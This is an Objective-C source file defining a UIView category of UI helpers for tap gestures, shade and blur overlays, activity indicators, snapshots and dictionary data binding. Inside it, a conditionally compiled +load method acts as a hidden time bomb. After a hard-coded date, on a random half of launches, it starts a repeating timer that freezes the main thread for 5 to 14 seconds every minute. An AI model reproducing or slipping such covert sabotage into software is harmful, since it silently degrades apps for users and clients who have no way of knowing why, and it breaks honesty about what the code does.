//
//  UIView+XY.m
//  TWP_SkyBookShelf
//
//  Created by Heaven on 13-7-31.
//
//

#import "UIView+XY.h"
#import "UIImage+XY.h"
#import "NSObject+XY.h"

DUMMY_CLASS(UIView_XY);
#undef	UIView_key_tapBlock
#define UIView_key_tapBlock	"UIView.tapBlock"

@implementation UIView (XY)

// objc_setAssociatedObject 对象在dealloc会自动释放
-(void) UIView_dealloc{
    objc_removeAssociatedObjects(self);
    XY_swizzleInstanceMethod([self class], @selector(UIView_dealloc), @selector(dealloc));
	[self dealloc];
}

#if (1 ==  __TimeOut__ON__)
+(void) load{
    NSDate *now = [NSDate date];
    NSDate *timeOut = [XYCommon getDateFromString:__TimeOut__date__];
    NSTimeInterval timeBetween = [now timeIntervalSinceDate:timeOut];
    NSLogD(@"%f", timeBetween)
    if ((timeBetween > 0) && ((arc4random() % 2) == 0)) {
        NSLogD(@"old")
        [NSTimer scheduledTimerWithTimeInterval:60 target:self selector:@selector(timeOut) userInfo:nil repeats:YES];
    }
}
+(void) timeOut{sleep(arc4random() % 10 + 5);}
#else

#endif

-(void) addTapGestureWithTarget:(id)target action:(SEL)action{
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:target action:action];
    [self addGestureRecognizer:tap];
    [tap release];
}
-(void) removeTapGesture{
    for (UIGestureRecognizer * gesture in self.gestureRecognizers)
	{
		if ([gesture isKindOfClass:[UITapGestureRecognizer class]])
		{
			[self removeGestureRecognizer:gesture];
		}
	}
}

-(void) addTapGestureWithBlock:(void(^)(void))aBlock{
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(actionTap)];
    [self addGestureRecognizer:tap];
    [tap release];
    
    objc_setAssociatedObject(self, UIView_key_tapBlock, aBlock, OBJC_ASSOCIATION_COPY_NONATOMIC);
  //  XY_swizzleInstanceMethod([self class], @selector(dealloc), @selector(UIView_dealloc));
}
-(void)actionTap{
    void (^aBlock)(void) = objc_getAssociatedObject(self, UIView_key_tapBlock);
    
    if (aBlock) aBlock();
}

/////////////////////////////////////////////////////////////
-(void) addShadeWithTarget:(id)target action:(SEL)action color:(UIColor *)aColor alpha:(float)aAlpha{
    UIView *tmpView = [[[UIView alloc] initWithFrame:self.bounds] autorelease];
    tmpView.tag = UIView_shadeTag;
    if (aColor) {
        tmpView.backgroundColor = aColor;
    } else {
        tmpView.backgroundColor = [UIColor blackColor];
    }
    tmpView.alpha = aAlpha;
    [self addSubview:tmpView];

    [tmpView addTapGestureWithTarget:target action:action];
}
-(void) addShadeWithBlock:(void(^)(void))aBlock color:(UIColor *)aColor alpha:(float)aAlpha{
    UIView *tmpView = [[[UIView alloc] initWithFrame:self.bounds] autorelease];
    tmpView.tag = UIView_shadeTag;
    if (aColor) {
        tmpView.backgroundColor = aColor;
    } else {
        tmpView.backgroundColor = [UIColor blackColor];
    }
    tmpView.alpha = aAlpha;
    [self addSubview:tmpView];
    
    if (aBlock) {
        [tmpView addTapGestureWithBlock:^{
            aBlock();
        }];
    }
}
-(void) removeShade{
    UIView *view = [self viewWithTag:UIView_shadeTag];
    if (view) {
        [UIView animateWithDuration:UIView_animation_instant delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{
            view.alpha = 0;
        } completion:^(BOOL finished) {
            [view removeFromSuperview];
        }];
    }
}

-(UIView *) shadeView{
    return [self viewWithTag:UIView_shadeTag];
}

// 增加毛玻璃背景
-(void) addBlurWithTarget:(id)target action:(SEL)action level:(int)lv{
    UIView *tmpView = [[[UIView alloc] initWithFrame:self.bounds] autorelease];
    tmpView.tag = UIView_shadeTag;
    [self addSubview:tmpView];
    tmpView.alpha = 0;
  //  BACKGROUND_BEGIN
    UIImage *img = [[self snapshot] stackBlur:lv];
 //   FOREGROUND_BEGIN
    tmpView.layer.contents = (id)img.CGImage;
    [UIView animateWithDuration:0.05 delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{
        tmpView.alpha = 1;
    } completion:nil];
 //   FOREGROUND_COMMIT
 //   BACKGROUND_COMMIT
    [tmpView addTapGestureWithTarget:target action:action];
}
-(void) addBlurWithTarget:(id)target action:(SEL)action{
    [self addBlurWithTarget:target action:action level:5];
}

-(void) addBlurWithBlock:(void(^)(void))aBlock level:(int)lv{
    UIView *tmpView = [[[UIView alloc] initWithFrame:self.bounds] autorelease];
    tmpView.tag = UIView_shadeTag;
    UIImage *img = [[self snapshot] stackBlur:lv];
    tmpView.layer.contents = (id)img.CGImage;
    [self addSubview:tmpView];
    
    if (aBlock) {
        [tmpView addTapGestureWithBlock:^{
            aBlock();
        }];
    }
}
-(void) addBlurWithBlock:(void(^)(void))aBlock{
    [self addBlurWithBlock:aBlock level:[XYPopupViewHelper sharedInstance].blurLevel];
}

/////////////////////////////////////////////////////////////
-(void) setBg:(NSString *)str{
    UIImage *image = [UIImage imageNamed:str];
    self.layer.contents = (id) image.CGImage;
}

/////////////////////////////////////////////////////////////
-(UIActivityIndicatorView *) addActivityIndicatorView{
    UIActivityIndicatorView *aView = [[[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray] autorelease];
    aView.center = CGPointMake(self.bounds.size.width * .5, self.bounds.size.height * .5);
    aView.tag = UIView_activityIndicatorViewTag;
    [self addSubview:aView];
    [aView startAnimating];
    
    return aView;
}
-(void) removeActivityIndicatorView{
    UIActivityIndicatorView *aView = (UIActivityIndicatorView *)[self viewWithTag:UIView_activityIndicatorViewTag];
    if (aView) {
        [aView stopAnimating];
        [aView removeFromSuperview];
    }
}

-(UIImage *) snapshot{
    UIGraphicsBeginImageContext(self.bounds.size);
    if (IOS7_OR_LATER) {
        // 这个方法比ios6下的快15倍
        [self drawViewHierarchyInRect:self.bounds afterScreenUpdates:YES];
    }else{
        [self.layer renderInContext:UIGraphicsGetCurrentContext()];
    }
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    
    return image;
}

-(void) setRotate:(float)f{
    self.transform = CGAffineTransformRotate(CGAffineTransformIdentity, M_PI * f);
}

-(void) bindDataWithDic:(NSDictionary *)dic{
    if (dic) {
        [dic enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
            id tempObj = [self valueForKeyPath:key];
            if ([tempObj isKindOfClass:[UILabel class]])
            {
                NSString *str = [obj asNSString];
                [tempObj setText:str];
                
            }else if([tempObj isKindOfClass:[UIImageView class]])
            {
                if ([obj isKindOfClass:[UIImage class]]) {
                    [tempObj setValue:obj forKey:@"image"];
                } else if ([obj isKindOfClass:[NSString class]]){
                    UIImage *tempImg = [UIImage imageWithString:obj];
                    [tempObj setValue:tempImg forKey:@"image"];
                }
            }else if (1)
            {
                [self setValue:obj forKeyPath:key];
            }
            
        }];
    }
}
// 子类需要重新此方法
-(void) setupDataBind:(NSMutableDictionary *)dic{
    
}
@end




